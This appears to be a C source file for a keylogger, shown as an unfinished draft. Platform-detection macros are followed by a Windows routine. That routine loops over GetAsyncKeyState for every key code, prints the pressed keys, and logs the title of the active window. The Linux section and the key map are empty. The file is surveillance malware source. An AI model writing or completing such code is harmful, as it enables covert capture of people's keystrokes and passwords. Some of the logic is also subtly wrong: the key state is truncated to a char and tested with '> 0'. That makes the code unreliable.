//
// Created by mallo on 13/12/2022.
//

/**
 * Determination a platform of an operation system
 * Fully supported supported only GNU GCC/G++, partially on Clang/LLVM
 */

#if defined(_WIN32)
#define PLATFORM_WINDOWS "windows" // Windows
#define PLATFORM_NAME "windows"
#elif defined(_WIN64)
#define PLATFORM_WINDOWS "windows" // Windows
    #define PLATFORM_NAME "windows"
#elif defined(__CYGWIN__) && !defined(_WIN32)
#define PLATFORM_WINDOWS "windows" // Windows (Cygwin POSIX under Microsoft Window)
    #define PLATFORM_NAME "windows"
#elif defined(__ANDROID__)
#define PLATFORM_ANDROID "android" // Android (implies Linux, so it must come first)
    #define PLATFORM_NAME "android"
#elif defined(__linux__)
#define PLATFORM_LINUX "linux" // Debian, Ubuntu, Gentoo, Fedora, openSUSE, RedHat, Centos and other
    #define PLATFORM_NAME "linux"
#elif defined(__unix__) || !defined(__APPLE__) && defined(__MACH__)
#include <sys/param.h>
    #if defined(BSD)
        #define PLATFORM_BSD "bsd" // FreeBSD, NetBSD, OpenBSD, DragonFly BSD
        #define PLATFORM_NAME "bsd"
    #endif
#elif defined(__hpux)
#define PLATFORM_HP_UX "hp-ux" // HP-UX
    #define PLATFORM_NAME "hp-ux"
#elif defined(_AIX)
#define PLATFORM_AIX "aix" // IBM AIX
    #define PLATFORM_NAME "aix"
#elif defined(__APPLE__) && defined(__MACH__) // Apple OSX and iOS (Darwin)
#include <TargetConditionals.h>
    #if TARGET_IPHONE_SIMULATOR == 1
        #define PLATFORM_IOS "ios" // Apple iOS
        #define PLATFORM_NAME "ios"
    #elif TARGET_OS_IPHONE == 1
        #define PLATFORM_IOS "ios" // Apple iOS
        #define PLATFORM_NAME "ios"
    #elif TARGET_OS_MAC == 1
        #define PLATFORM_OSX "osx" // Apple OSX
        #define PLATFORM_NAME "osx"
    #endif
#elif defined(__sun) && defined(__SVR4)
#define PLATFORM_SOLARIS "solaris" // Oracle Solaris, Open Indiana
    #define PLATFORM_NAME "solaris"
#else
#define PLATFORM_NULL NULL
#define PLATFORM_NAME NULL
#endif

#include <stdio.h>
#include "keylogger.h"

#define BUFLEN 4096 /* dimensione buffer di appoggio */

const char *keymap[] = {

};


#if defined PLATFORM_WINDOWS
    #include <windows.h>

    HWND wincurrent, winlast;
    unsigned char string[256];
    unsigned char buffer[BUFLEN];

    void keylogger(int writeout) {
        while(1) {
            for (int i = 0; i < 256; i++) {
                char key = GetAsyncKeyState(i);
                if (key > 0) {
                    printf("%d", i);
                }
            }
            SearchActiveWindow();
            Sleep(10); /* previene la saturazione della CPU */
        }
    }

    void SearchActiveWindow(void) {
        wincurrent = GetForegroundWindow();
        if(wincurrent != winlast) {
            winlast = wincurrent;
            int err = GetWindowText(wincurrent, string, 256); /* primo metodo */
            if(err != 0) {
                if(strlen(string) == 0) sprintf( buffer, "\r\n[>>> ??? <<<]");
                else sprintf(buffer, "\r\n[>>> %.256s <<<]",string);
            }
             /* non ha funzionato... secondo metodo */
            else {
                SendMessage(wincurrent, WM_GETTEXT, (WPARAM)256, (LPARAM)string);
                if(strlen(string) == 0) sprintf( buffer, "\r\n[>>> ??? <<<]");
                else sprintf(buffer, "\r\n[>>> %.256s <<<]", string);
            }
        }
    }
#endif


#if defined PLATFORM_LINUX

#endif